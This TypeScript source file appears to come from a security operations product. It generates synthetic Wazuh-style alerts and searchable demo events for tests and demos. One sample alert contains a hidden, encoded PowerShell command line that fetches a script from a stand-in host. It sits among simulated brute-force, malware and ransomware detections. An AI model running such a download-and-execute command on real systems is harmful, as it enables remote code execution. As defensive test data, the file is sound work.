import { toDetectionFinding } from "@/lib/ocsf/map";
import {
  clampRange, DAY_MS, decodeCursor, encodeCursor, entityFilters, pageSizeFor,
  type DataCapabilities, type EventEntity, type EventPage, type EventSearchQuery, type SearchEvent, type SecurityDataProvider, type TenantDataScope,
} from "./data";
import type { AlertQuery, NormalisedAlert, NormalisedAsset, ProviderHealth, ResponseActionRequest, SecurityEventProvider } from "./types";
import { wazuhLevelToSeverity } from "./wazuh";

type DemoAgent = { id: string; name: string; group: string; os: string; ip: string };

/**
 * Synthetic Wazuh-shaped telemetry for demos and tests (DEMO_MODE=true). Never enabled
 * in production builds unless explicitly configured.
 */
export type DemoEventSpec = {
  ruleId: string;
  level: number;
  title: string;
  groups: string[];
  mitre: string[];
  data: Record<string, unknown>;
  log: string;
};

export const DEMO_SCENARIOS: DemoEventSpec[] = [
  { ruleId: "60122", level: 5, title: "Logon failure - unknown user or bad password", groups: ["windows", "authentication_failed"], mitre: ["T1110"],
    data: { srcip: "185.220.101.47", dstuser: "svc-backup" }, log: "An account failed to log on. Source 185.220.101.47" },
  { ruleId: "60106", level: 8, title: "Successful logon from external IP after failures", groups: ["windows", "authentication_success"], mitre: ["T1078"],
    data: { srcip: "185.220.101.47", dstuser: "j.nguyen.admin" }, log: "An account was successfully logged on from 185.220.101.47" },
  { ruleId: "92057", level: 12, title: "Encoded PowerShell command executed", groups: ["windows", "powershell"], mitre: ["T1059.001", "T1027"],
    data: { win: { eventdata: { commandLine: "powershell -nop -w hidden -enc SQBFAFgA... http://update-check.xyz/p.ps1", subjectUserName: "j.nguyen.admin" } } },
    log: "PowerShell spawned with encoded command contacting update-check.xyz" },
  { ruleId: "87105", level: 13, title: "Known malware hash written to disk (VirusTotal/CTI match)", groups: ["syscheck", "malware"], mitre: ["T1105"],
    data: { syscheck: { path: "C:\\Users\\Public\\svchost32.exe", sha256_after: "b8e0a7c3d7a6f7e8c1d0f3e2a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3" } },
    log: "File added: C:\\Users\\Public\\svchost32.exe" },
  { ruleId: "100210", level: 14, title: "Mass file rename with ransomware extension", groups: ["ransomware", "syscheck"], mitre: ["T1486"],
    data: { win: { eventdata: { image: "C:\\ProgramData\\lck.exe" } } }, log: "4,812 files renamed to *.lockbit in 90s" },
  { ruleId: "5712", level: 10, title: "SSHD brute force trying to get access to the system", groups: ["sshd", "authentication_failures"], mitre: ["T1110.001"],
    data: { srcip: "45.155.205.233", srcuser: "root" }, log: "sshd: Failed password for root from 45.155.205.233" },
  { ruleId: "31151", level: 6, title: "Multiple web server 400 error codes from same source", groups: ["web", "attack"], mitre: ["T1595"],
    data: { srcip: "194.26.29.113", url: "/wp-login.php" }, log: "GET /wp-login.php 404 from 194.26.29.113" },
  { ruleId: "23505", level: 11, title: "Vulnerable package with known exploited CVE detected", groups: ["vulnerability-detector"], mitre: ["T1190"],
    data: { vulnerability: { cve: "CVE-2024-3400", package: { name: "PAN-OS" } } }, log: "CVE-2024-3400 affects PAN-OS GlobalProtect" },
];

export class DemoProvider implements SecurityEventProvider {
  readonly kind = "demo";
  constructor(private readonly agents: { id: string; name: string; group: string; os: string; ip: string }[]) {}

  /** One authored demo event. Training replay uses this so the queue is the scenario, not a random draw. */
  materialise(
    spec: DemoEventSpec,
    agent: { id: string; name: string; ip: string },
    externalId: string,
    now: Date,
    index = 0,
  ): NormalisedAlert {
    const user = (spec.data.dstuser ?? spec.data.srcuser ?? null) as string | null;
    return {
      externalId,
      ruleId: spec.ruleId,
      title: spec.title,
      description: spec.log,
      category: spec.groups[0] ?? null,
      siemSeverity: spec.level,
      severity: wazuhLevelToSeverity(spec.level),
      occurredAt: new Date(now.getTime() - index * 1000),
      assetExternalId: agent.id,
      hostname: agent.name,
      userName: user,
      attackTechniques: spec.mitre,
      routingKeys: [`agent:${agent.id}`],
      raw: {
        rule: { id: spec.ruleId, level: spec.level, description: spec.title, groups: spec.groups, mitre: { id: spec.mitre } },
        agent: { id: agent.id, name: agent.name, ip: agent.ip },
        data: spec.data,
        full_log: spec.log,
      },
    };
  }

  generate(count: number, now = new Date()): NormalisedAlert[] {
    return Array.from({ length: count }, (_, i) => {
      const spec = DEMO_SCENARIOS[Math.floor(Math.random() * DEMO_SCENARIOS.length)]!;
      const agent = this.agents[Math.floor(Math.random() * this.agents.length)]!;
      const id = `demo-${now.getTime()}-${i}-${Math.random().toString(36).slice(2, 8)}`;
      return this.materialise(spec, agent, id, now, i);
    });
  }

  async getAlerts(q: AlertQuery) {
    return { alerts: this.generate(Math.min(q.limit ?? 3, 3)), cursor: null };
  }
  async getAlert() {
    return null;
  }
  async searchEvents() {
    return { total: 0, events: [] };
  }
  async getAssets(): Promise<NormalisedAsset[]> {
    return this.agents.map((a) => ({
      externalId: a.id, kind: /server/i.test(a.os) ? "server" : "endpoint", name: a.name, hostname: a.name, ips: [a.ip], os: a.os, macs: [],
      agentStatus: "active", lastSeen: new Date(), routingKeys: [`group:${a.group}`], raw: {},
    }));
  }
  async getAsset(id: string) {
    return (await this.getAssets()).find((a) => a.externalId === id) ?? null;
  }
  supportedActions(): ResponseActionRequest["action"][] {
    return ["isolate_endpoint", "release_endpoint", "block_ip"];
  }
  async executeResponseAction(req: ResponseActionRequest) {
    return { ok: true, message: `[demo] ${req.action} simulated on agent ${req.assetExternalId}` };
  }
  async health(): Promise<ProviderHealth> {
    return { ok: true, latencyMs: 1, detail: { mode: "demo", agents: this.agents.length } };
  }
  dataProvider(scope: TenantDataScope): SecurityDataProvider {
    const mine = scope.agentIds === "all" ? this.agents : this.agents.filter((a) => (scope.agentIds as readonly string[]).includes(a.id));
    return new DemoDataProvider(this, mine, scope);
  }
}

export const DEMO_DATA_CAPABILITIES: DataCapabilities = {
  search: true,
  getEvent: true,
  entityActivity: true,
  ocsfClasses: [2004],
  maxRangeMs: 30 * DAY_MS,
  paging: "cursor",
  maxPageSize: 200,
  freeText: "substring",
  filters: ["severity", "host", "user", "ip", "ruleId"],
  tiers: ["hot"],
};

const SLOT_MS = 37 * 60_000;

function demoHash(s: string): number {
  let h = 2166136261;
  for (let i = 0; i < s.length; i++) h = Math.imul(h ^ s.charCodeAt(i), 16777619);
  return h >>> 0;
}

const isDemoCursor = (v: unknown): v is [number, number] => Array.isArray(v) && v.length === 2 && v.every((n) => Number.isInteger(n) && n >= 0);

/**
 * Deterministic synthetic telemetry for the demo cluster, so event search works without an indexer.
 * The same slot and agent always produce the same event; only the tenant's agents are generated.
 */
class DemoDataProvider implements SecurityDataProvider {
  readonly kind = "demo";
  private readonly agents: DemoAgent[];

  constructor(private readonly source: DemoProvider, agents: DemoAgent[], private readonly scope: TenantDataScope) {
    this.agents = [...agents].sort((a, b) => (a.id < b.id ? 1 : -1));
  }

  capabilities(): DataCapabilities {
    return DEMO_DATA_CAPABILITIES;
  }

  /** The event an agent produced in a slot, if any (about one slot in three). */
  private at(agent: DemoAgent, slot: number): SearchEvent | null {
    const h = demoHash(`${agent.id}:${slot}`);
    if (h % 3 !== 0) return null;
    const spec = DEMO_SCENARIOS[h % DEMO_SCENARIOS.length]!;
    const id = `demo:${agent.id}:${slot}`;
    const time = new Date(slot * SLOT_MS + (h % (SLOT_MS / 1000)) * 1000);
    const alert = this.source.materialise(spec, agent, id, time);
    return {
      id,
      time: time.getTime(),
      ocsf: toDetectionFinding(alert, { source: "demo", sourceEventId: id, tenantId: this.scope.tenantId, ingestedAt: time }),
      provenance: { integrationId: this.scope.integrationId, provider: "demo", tenantId: this.scope.tenantId, tier: "hot", location: "demo" },
      raw: alert.raw,
    };
  }

  private matches(e: SearchEvent, q: EventSearchQuery): boolean {
    const raw = e.raw as { rule?: { id?: string; level?: number }; agent?: { name?: string; ip?: string }; data?: Record<string, unknown> };
    const blob = JSON.stringify(raw).toLowerCase();
    const f = q.filters ?? {};
    const sev = wazuhLevelToSeverity(raw.rule?.level ?? 0);
    if (q.text?.trim() && !blob.includes(q.text.trim().toLowerCase())) return false;
    if (f.severity?.length && !f.severity.includes(sev)) return false;
    if (f.host?.trim() && !(raw.agent?.name ?? "").toLowerCase().includes(f.host.trim().toLowerCase())) return false;
    if (f.user?.trim() && !blob.includes(`"${f.user.trim().toLowerCase()}"`)) return false;
    if (f.ip?.trim() && !blob.includes(`"${f.ip.trim()}"`)) return false;
    if (f.ruleId?.trim() && raw.rule?.id !== f.ruleId.trim()) return false;
    return true;
  }

  async search(q: EventSearchQuery): Promise<EventPage> {
    const caps = this.capabilities();
    const range = clampRange(q, caps);
    const size = pageSizeFor(q, caps);
    const after = decodeCursor(q.cursor, isDemoCursor);
    const events: SearchEvent[] = [];
    const first = Math.floor(range.from.getTime() / SLOT_MS);
    const last = Math.floor(range.to.getTime() / SLOT_MS);
    let slot = after ? Math.min(after[0], last) : last;
    let agentIdx = after && after[0] <= last ? after[1] + 1 : 0;
    let next: [number, number] | null = null;
    for (; slot >= first && !next; slot--, agentIdx = 0) {
      for (; agentIdx < this.agents.length; agentIdx++) {
        const e = this.at(this.agents[agentIdx]!, slot);
        if (!e || e.time < range.from.getTime() || e.time > range.to.getTime() || !this.matches(e, q)) continue;
        events.push(e);
        if (events.length === size) {
          next = [slot, agentIdx];
          break;
        }
      }
    }
    return { events: events.sort((a, b) => b.time - a.time), cursor: next ? encodeCursor(next) : null, ...(range.clamped ? { partial: "range limited to the last 30 days" } : {}) };
  }

  async getEvent(id: string): Promise<SearchEvent | null> {
    const m = /^demo:([^:]+):(\d+)$/.exec(id);
    const agent = m && this.agents.find((a) => a.id === m[1]);
    return agent ? this.at(agent, Number(m[2])) : null;
  }

  getEntityActivity(entity: EventEntity, range: { from: Date; to: Date }, page: { pageSize?: number; cursor?: string | null } = {}): Promise<EventPage> {
    return this.search({ ...range, ...page, filters: entityFilters(entity) });
  }

  health(): Promise<ProviderHealth> {
    return this.source.health();
  }
}
